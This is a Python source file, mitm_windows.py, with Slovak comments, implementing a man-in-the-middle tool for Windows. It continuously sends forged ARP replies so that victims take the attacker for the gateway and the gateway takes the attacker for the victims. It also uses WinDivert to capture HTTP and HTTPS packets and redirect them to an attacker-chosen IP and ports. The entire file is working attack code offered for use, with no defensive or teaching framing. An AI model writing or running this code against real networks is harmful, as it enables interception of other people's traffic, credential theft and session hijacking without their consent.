# mitm_windows.py
import pydivert
import scapy.all as scapy
import time
import signal
import sys
import threading

class WindowsMITM:
    def __init__(self, redirect_ip, redirect_ports=(8080, 8443), iface=None):
        self.redirect_ip = redirect_ip
        self.redirect_http, self.redirect_https = redirect_ports
        self.iface = iface or scapy.conf.iface
        self.attacker_mac = scapy.get_if_hwaddr(self.iface)
        self.running = False
        self.divert = None

    def start_divert(self):
        # Zachytáva *prichádzajúce* HTTP/HTTPS pakety smerom na tento stroj
        filter_str = (
            f"tcp.DstPort == 80 or tcp.DstPort == 443 "
            f"and ip.DstAddr == {scapy.get_if_addr(self.iface)}"
        )
        self.divert = pydivert.WinDivert(filter_str, layer=pydivert.Layer.NETWORK)
        self.divert.open()
        print(f"[*] WinDivert aktivovaný. Presmerovávam na {self.redirect_ip}")

        def divert_loop():
            while self.running:
                try:
                    packet = self.divert.recv()
                    if packet.tcp.dst_port == 80:
                        packet.dst_port = self.redirect_http
                    elif packet.tcp.dst_port == 443:
                        packet.dst_port = self.redirect_https
                    packet.dst_addr = self.redirect_ip
                    packet.direction = pydivert.Direction.OUTBOUND
                    self.divert.send(packet)
                except Exception as e:
                    if self.running:
                        print(f"[!] WinDivert error: {e}")
        self.divert_thread = threading.Thread(target=divert_loop, daemon=True)
        self.divert_thread.start()

    def start_spoof(self, targets, gateway_ip, interval=2):
        def spoof_loop():
            while self.running:
                for target_ip, target_mac in targets:
                    if target_mac:
                        # Hovorím obeti: "som brána"
                        scapy.send(scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
                                            psrc=gateway_ip, hwsrc=self.attacker_mac),
                                 verbose=False, iface=self.iface)
                        # Hovorím bráne: "som obete"
                        gw_mac = scapy.getmacbyip(gateway_ip)
                        if gw_mac:
                            scapy.send(scapy.ARP(op=2, pdst=gateway_ip, hwdst=gw_mac,
                                                psrc=target_ip, hwsrc=self.attacker_mac),
                                     verbose=False, iface=self.iface)
                time.sleep(interval)
        self.spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
        self.spoof_thread.start()

    def start(self, targets, gateway_ip):
        self.running = True
        self.start_divert()
        self.start_spoof(targets, gateway_ip)

    def stop(self):
        self.running = False
        if self.divert:
            self.divert.close()
        print("[*] WinDivert zastavený.")
